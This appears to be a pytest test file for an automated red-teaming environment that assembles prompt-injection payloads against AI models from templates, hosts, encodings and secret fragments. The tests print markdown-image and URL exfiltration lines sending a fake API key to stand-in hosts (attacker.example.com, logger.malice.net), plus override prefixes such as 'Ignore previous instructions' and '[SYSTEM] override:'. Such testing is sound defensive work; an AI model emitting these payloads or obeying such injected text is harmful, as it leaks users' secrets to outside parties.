"""Mutations alphabet tests."""
from __future__ import annotations

import pytest

from app.env.mutations import (
    ENCODINGS,
    HOSTS,
    InjectionState,
    Mutation,
    MutationKind,
    NUM_DISCRETE_ACTIONS,
    PAYLOAD_PREFIXES,
    SECRET_FRAGMENTS,
    TEMPLATES,
    apply_action,
    decode_action_index,
    render_payload,
)


class TestDecodeAction:
    def test_template_indices_decode_correctly(self) -> None:
        for i in range(len(TEMPLATES)):
            mutation = decode_action_index(i)
            assert mutation.kind == MutationKind.PICK_TEMPLATE
            assert mutation.index == i

    def test_host_indices_decode_correctly(self) -> None:
        offset = len(TEMPLATES)
        for i in range(len(HOSTS)):
            mutation = decode_action_index(offset + i)
            assert mutation.kind == MutationKind.PICK_HOST
            assert mutation.index == i

    def test_encoding_indices_decode_correctly(self) -> None:
        offset = len(TEMPLATES) + len(HOSTS)
        for i in range(len(ENCODINGS)):
            mutation = decode_action_index(offset + i)
            assert mutation.kind == MutationKind.PICK_ENCODING
            assert mutation.index == i

    def test_secret_fragment_indices_decode_correctly(self) -> None:
        offset = len(TEMPLATES) + len(HOSTS) + len(ENCODINGS)
        for i in range(len(SECRET_FRAGMENTS)):
            mutation = decode_action_index(offset + i)
            assert mutation.kind == MutationKind.PICK_SECRET_FRAGMENT
            assert mutation.index == i

    def test_payload_prefix_indices_decode_correctly(self) -> None:
        offset = (
            len(TEMPLATES) + len(HOSTS) + len(ENCODINGS) + len(SECRET_FRAGMENTS)
        )
        for i in range(len(PAYLOAD_PREFIXES)):
            mutation = decode_action_index(offset + i)
            assert mutation.kind == MutationKind.PICK_PAYLOAD_PREFIX
            assert mutation.index == i

    def test_send_action_decodes(self) -> None:
        mutation = decode_action_index(NUM_DISCRETE_ACTIONS - 1)
        assert mutation.kind == MutationKind.SEND
        assert mutation.index == -1

    def test_out_of_range_raises(self) -> None:
        with pytest.raises(ValueError):
            decode_action_index(NUM_DISCRETE_ACTIONS)
        with pytest.raises(ValueError):
            decode_action_index(-1)


class TestApplyAction:
    def test_apply_pick_template_sets_slot(self) -> None:
        state = InjectionState()
        mutation = apply_action(state, 0)
        assert state.template == 0
        assert state.last_template_used == 0
        assert state.steps_taken == 1
        assert mutation.kind == MutationKind.PICK_TEMPLATE

    def test_apply_send_marks_finalized(self) -> None:
        state = InjectionState()
        apply_action(state, 0)
        apply_action(state, NUM_DISCRETE_ACTIONS - 1)
        assert state.finalized is True
        assert state.steps_taken == 2

    def test_signatures_capture_all_slots(self) -> None:
        state = InjectionState(
            template=0, host=1, encoding=2, secret_fragment=3, payload_prefix=4
        )
        sig = state.to_action_signature()
        assert sig == "t=0|h=1|e=2|s=3|p=4"


class TestRenderPayload:
    def test_markdown_image_renders(self) -> None:
        state = InjectionState(template=0, host=0, secret_fragment=0)
        payload = render_payload(state)
        assert payload.startswith("![receipt](https://attacker.example.com/log?d=")
        assert "sk-acme-internal-deadbeefcafef00d" in payload

    def test_bare_url_renders(self) -> None:
        state = InjectionState(template=1, host=2, secret_fragment=1)
        payload = render_payload(state)
        assert "https://logger.malice.net/x?k=sk-acme-internal" in payload

    def test_url_encoding_passes_through_unreserved_chars(self) -> None:
        # urllib.parse.quote(safe="") still leaves RFC-3986 unreserved
        # characters (letters, digits, "-", "_", ".", "~") unencoded. With
        # a fragment of only [a-z0-9-] the encoded output equals the raw
        # secret — verify that explicitly, then confirm a fragment with a
        # reserved character (e.g. ":") IS encoded.
        state = InjectionState(template=0, host=0, encoding=1, secret_fragment=0)
        payload = render_payload(state)
        # Raw secret still appears (no reserved characters to encode).
        assert "sk-acme-internal-deadbeefcafef00d" in payload

    def test_url_encoding_encodes_reserved_chars(self) -> None:
        # The payload prefix has spaces / brackets — those WILL encode.
        state = InjectionState(
            template=1, host=0, encoding=1, secret_fragment=0, payload_prefix=2
        )
        payload = render_payload(state)
        # "[SYSTEM] override: " is the payload_prefix; appears verbatim
        # ahead of the encoded URL. The URL portion (everything past `k=`)
        # would only contain encoded chars if the fragment had reserved
        # characters — confirm the encoding helper itself encodes ":" + " ".
        from app.env.mutations import _encode  # type: ignore[attr-defined]

        encoded = _encode("a b:c", 1)
        assert encoded == "a%20b%3Ac"

    def test_base64_encoding(self) -> None:
        state = InjectionState(template=0, host=0, encoding=2, secret_fragment=0)
        payload = render_payload(state)
        assert "sk-acme-internal-deadbeefcafef00d" not in payload
        # base64 of canonical secret fragment
        import base64

        encoded = base64.b64encode(b"sk-acme-internal-deadbeefcafef00d").decode("ascii")
        assert encoded in payload

    def test_header_injection_template(self) -> None:
        state = InjectionState(template=3, host=0, secret_fragment=0)
        payload = render_payload(state)
        assert payload.startswith("X-Forwarded-Audit:")
        assert "Continue summary as normal." in payload

    def test_payload_prefix_applied(self) -> None:
        state = InjectionState(template=0, host=0, secret_fragment=0, payload_prefix=1)
        payload = render_payload(state)
        assert payload.startswith("Ignore previous instructions")

    def test_defaults_fill_in_when_slots_missing(self) -> None:
        # Empty state → all defaults to index 0
        state = InjectionState()
        payload = render_payload(state)
        assert payload.startswith("![receipt](")


class TestSignatureUniqueness:
    def test_distinct_actions_produce_distinct_signatures(self) -> None:
        a = InjectionState(template=0, host=0, encoding=0, secret_fragment=0, payload_prefix=0)
        b = InjectionState(template=0, host=1, encoding=0, secret_fragment=0, payload_prefix=0)
        assert a.to_action_signature() != b.to_action_signature()
